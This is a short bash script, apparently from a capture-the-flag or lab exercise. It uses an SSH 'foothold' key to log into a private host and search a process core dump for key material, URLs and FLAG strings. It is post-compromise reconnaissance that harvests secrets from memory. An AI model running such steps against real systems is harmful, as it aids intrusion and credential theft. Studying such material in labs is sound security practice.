#!/bin/bash
S="ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/keplerops-foothold -p 2222 rowan@10.50.13.180"
echo "===== core file ====="
$S 'ls -la ~/core; file ~/core 2>/dev/null; ps aux | grep -v grep | grep -iE "python|core|dump" | head'
echo "===== core context strings ====="
$S 'timeout 220 grep -aoE ".{100}(arwc_key|arwcpkg|scan_arwc|supply|procurement|district|replacement).{100}" ~/core 2>/dev/null | sort -u | head -100'
echo "===== core urls/flags ====="
$S 'echo ---URLS; timeout 120 grep -aoE "https?://[A-Za-z0-9._:/-]{4,90}" ~/core 2>/dev/null | sort -u | head -80; echo ---FLAGS; timeout 90 grep -aoE "FLAG\{[0-9a-f]{16}\}" ~/core 2>/dev/null | sort -u | head'
